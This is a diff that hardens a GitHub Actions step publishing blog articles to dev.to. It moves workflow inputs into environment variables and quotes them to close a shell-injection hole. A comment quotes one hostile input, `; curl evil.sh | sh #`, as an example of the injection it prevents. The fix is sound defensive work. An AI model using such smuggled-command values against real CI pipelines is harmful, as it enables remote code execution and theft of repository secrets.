@@ -59,21 +59,38 @@ jobs:
       - name: Publish
         env:
           DEVTO_API_KEY: ${{ secrets.DEVTO_API_KEY }}
+          # Inputs are staged as ENV, never interpolated into the script body.
+          # `${{ inputs.article }}` inline is a shell-injection vector
+          # (CWE-78): a dispatch with `; curl evil.sh | sh #` would run in a
+          # runner where DEVTO_API_KEY is in scope. The template engine emits
+          # a literal assignment here; the shell only ever sees a variable.
+          ARTICLE_INPUT: ${{ inputs.article }}
+          DRY_RUN: ${{ inputs.dry_run }}
         run: |
           # Targeting one article is the normal case. The publish script has
           # always supported --article; the workflow did not expose it, so the
           # only available action was "publish all 91", which is precisely the
           # Capsule-0 shape this workflow was locked down for. A gate you can
           # only pass by doing the dangerous thing is not a gate.
-          ARGS=""
-          if [ -n "${{ inputs.article }}" ]; then
-            ARGS="--article ${{ inputs.article }}"
-            echo "::notice::targeting a single article: ${{ inputs.article }}"
+          if [ -n "$ARTICLE_INPUT" ]; then
+            echo "::notice::targeting a single article: $ARTICLE_INPUT"
           else
             echo "::warning::no article given — this run covers the ENTIRE corpus"
           fi
-          if [ "${{ inputs.dry_run }}" = "true" ]; then
-            node apps/blog/scripts/publish-to-devto.mjs --dry-run $ARGS
+
+          # Branch on the two shapes rather than building an ARGS string:
+          # an unquoted "$ARGS" would word-split a slug containing spaces,
+          # which is the same class of bug one layer down.
+          if [ "$DRY_RUN" = "true" ]; then
+            if [ -n "$ARTICLE_INPUT" ]; then
+              node apps/blog/scripts/publish-to-devto.mjs --dry-run --article "$ARTICLE_INPUT"
+            else
+              node apps/blog/scripts/publish-to-devto.mjs --dry-run
+            fi
           else
-            node apps/blog/scripts/publish-to-devto.mjs $ARGS
+            if [ -n "$ARTICLE_INPUT" ]; then
+              node apps/blog/scripts/publish-to-devto.mjs --article "$ARTICLE_INPUT"
+            else
+              node apps/blog/scripts/publish-to-devto.mjs
+            fi
           fi
